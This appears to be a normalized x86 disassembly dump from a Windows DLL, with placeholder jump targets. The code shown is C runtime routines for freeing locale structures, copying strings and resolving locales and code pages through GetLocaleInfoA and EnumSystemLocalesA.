call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_1001db8a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10011c31
push [ esi + 0x8 ]
call sub_10011c31
push [ esi + 0xc ]
call sub_10011c31
push [ esi + 0x10 ]
call sub_10011c31
push [ esi + 0x14 ]
call sub_10011c31
push [ esi + 0x18 ]
call sub_10011c31
push [ esi ]
call sub_10011c31
push [ esi + 0x20 ]
call sub_10011c31
push [ esi + 0x24 ]
call sub_10011c31
push [ esi + 0x28 ]
call sub_10011c31
push [ esi + 0x2c ]
call sub_10011c31
push [ esi + 0x30 ]
call sub_10011c31
push [ esi + 0x34 ]
call sub_10011c31
push [ esi + 0x1c ]
call sub_10011c31
push [ esi + 0x38 ]
call sub_10011c31
push [ esi + 0x3c ]
call sub_10011c31
add esp 0x40
push [ esi + 0x40 ]
call sub_10011c31
push [ esi + 0x44 ]
call sub_10011c31
push [ esi + 0x48 ]
call sub_10011c31
push [ esi + 0x4c ]
call sub_10011c31
push [ esi + 0x50 ]
call sub_10011c31
push [ esi + 0x54 ]
call sub_10011c31
push [ esi + 0x58 ]
call sub_10011c31
push [ esi + 0x5c ]
call sub_10011c31
push [ esi + 0x60 ]
call sub_10011c31
push [ esi + 0x64 ]
call sub_10011c31
push [ esi + 0x68 ]
call sub_10011c31
push [ esi + 0x6c ]
call sub_10011c31
push [ esi + 0x70 ]
call sub_10011c31
push [ esi + 0x74 ]
call sub_10011c31
push [ esi + 0x78 ]
call sub_10011c31
push [ esi + 0x7c ]
call sub_10011c31
add esp 0x40
push [ esi + 0x80 ]
call sub_10011c31
push [ esi + 0x84 ]
call sub_10011c31
push [ esi + 0x88 ]
call sub_10011c31
push [ esi + 0x8c ]
call sub_10011c31
push [ esi + 0x90 ]
call sub_10011c31
push [ esi + 0x94 ]
call sub_10011c31
push [ esi + 0x98 ]
call sub_10011c31
push [ esi + 0x9c ]
call sub_10011c31
push [ esi + 0xa0 ]
call sub_10011c31
push [ esi + 0xa4 ]
call sub_10011c31
push [ esi + 0xa8 ]
call sub_10011c31
add esp 0x2c
sub_1001dd1f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rw-data
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_100166ee
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_1001d76f
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_1001db8a
push esi
call sub_10011c31
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_1001dd98
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
push esi
call sub_10011c31
pop ecx
sub_1001dddd
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_100166ee
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_100166a9
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rw-data
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_10011c31
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_100166a9
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10018de6
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10018de6
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10018de6
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
jmp r-xdata
push esi
call sub_1001dd98
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_10011c31
push [ ebx + 0xbc ]
call sub_10011c31
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_10011c31
push [ ebp - 0x8 ]
call sub_10011c31
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1001dfa7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10011c31
pop ecx
push esi
call sub_10011c31
pop ecx
sub_1001e035
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_100166ee
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_100166a9
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_10011c31
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_100166a9
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10018de6
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10018de6
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_10011c31
push [ ebp - 0x8 ]
call sub_10011c31
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_1001dfa7
push ebx
call sub_10011c31
push [ ebp - 0x8 ]
call sub_10011c31
push [ ebp - 0x4 ]
call sub_10011c31
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_10011c31
push [ esi + 0xb0 ]
call sub_10011c31
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1001e2fb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_100167f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
sub_1001e36f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_100167f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
sub_1001e424
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_1002158e
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_1001e486
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_10013730
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10010789
leave
retn
push r--data
push esi
call sub_10013730
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_100215e0
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_1001e52a
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1001e54e
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_1001e582
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_1001e59d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10017c1c
mov esi eax
mov edx edi
add esi 0x9c
call sub_1001e54e
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_1002158e
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_1001e52a
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10010789
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_1001e635
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_1001e54e
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10010789
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_1001e582
push esi
mov edi eax
call sub_10010990
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_1001e6a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10017c1c
mov esi eax
mov edx edi
add esi 0x9c
call sub_1001e54e
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_1002158e
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1002158e
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1002158e
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100216e8
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1002158e
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_10010990
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_1001e52a
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_10010990
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_1001e635
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1001e87b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10017c1c
mov esi eax
mov edx edi
add esi 0x9c
call sub_1001e54e
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1002158e
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10010789
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1002158e
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_1001e635
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_1001e93c
push [ esi ]
call sub_10010990
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_10010990
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_1001e582
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_1001e6a9
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_1001e9a3
push [ esi ]
call sub_10010990
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_1001e582
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_1001e87b
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_1001e9df
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10017c1c
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_1001e424
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_1001e486
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_10010990
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_1001e59d
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_1001e9a3
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
